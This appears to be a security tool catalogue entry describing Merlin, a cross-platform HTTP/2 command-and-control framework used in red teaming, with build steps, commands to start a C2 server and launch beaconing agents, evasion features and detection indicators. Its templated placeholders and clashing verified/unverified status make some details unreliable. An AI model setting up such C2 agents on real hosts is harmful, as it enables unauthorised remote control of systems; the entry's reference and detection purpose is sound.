---
id: ec792e69-e91c-466d-97fe-c66725349cde
type: tool
verified: true
created_at: '2019-08-28T21:17:25.098770+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - c2
  - post-exploitation
  - http2
url: 'https://github.com/Ne0nd0g/merlin'
commands:
  - '[[commands/merlin-server-start-daemon]]'
  - '[[commands/merlin-agent-generate-http2]]'
  - '[[commands/merlin-agent-connect-server]]'
validated: true
---

# Merlin

**Status**: Unverified

## Overview

Merlin is a cross-platform asynchronous command and control (C2) framework implemented in Go. It is designed for post-exploitation operations, providing a flexible HTTP/2-based communication channel between agents and the server. Commonly used in red team engagements for maintaining persistence and executing commands on compromised hosts.

## Description

Merlin features a server component that listens for incoming agent connections and a modular agent that can be generated for various platforms. It supports encrypted communications, jittered beacons to evade detection, and integration with other tools for advanced operations. The framework is extensible, allowing custom modules for tasks like file transfer, screenshot capture, and privilege escalation.

## Features

- Feature 1: HTTP/2 C2 protocol for efficient, multiplexed communication over standard web ports.
- Feature 2: Cross-platform agent support (Windows, Linux, macOS) with architecture-specific binaries (x86, x64, ARM).
- Feature 3: AES encryption for all data in transit, with support for custom keys.
- Feature 4: Web-based and CLI interfaces for agent management and tasking.
- Feature 5: Built-in obfuscation and anti-analysis techniques to reduce detection.

## Installation

### Requirements

- Go 1.13 or later installed.
- Git for cloning the repository.

### Install Commands

```bash
# Clone the repository
git clone https://github.com/Ne0nd0g/merlin.git

# Build the binaries
cd merlin
make

# Or use Go directly
go build -o merlinServer ./cmd/merlinServer
 go build -o merlinAgent ./cmd/merlinAgent
```

For pre-built binaries, download releases from the GitHub repository.

## Basic Usage

```bash
./merlinServer --help
```

### Common Options

| Option | Description |
|--------|-------------|
| -h, --help | Show help message |
| -v, --version | Display version information |
| -d | Run in daemon mode |
| -k, --key | Specify encryption key |

## Examples

### Example 1: Basic Usage

Start the server:

```bash
./merlinServer -d -i 0.0.0.0 -p 443 -k testkey
```

Generate an agent:

```bash
./merlinAgent -generate -url https://192.168.1.100:443 -key testkey -platform linux -arch amd64
```

### Example 2: Advanced Usage

Launch agent with jitter:

```bash
./merlinAgent -server 192.168.1.100:443 -key testkey -delay 30 -jitter 10
```

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Unusual HTTP/2 traffic on non-standard ports or to C2 domains.
- Detection method 2: Presence of Go-compiled binaries (e.g., strings like "merlinAgent" in process memory).
- Detection method 3: Network connections with AES-encrypted payloads and jittered intervals.
- Detection method 4: Web server logs showing prolonged keep-alive HTTP/2 sessions from internal hosts.

## Related Procedures

No related procedures linked yet.

## Related Tools

- [[tools/Covenant]]
- [[tools/Empire]]

## References

- Official GitHub: https://github.com/Ne0nd0g/merlin
- Documentation: https://merlin-c2.readthedocs.io/
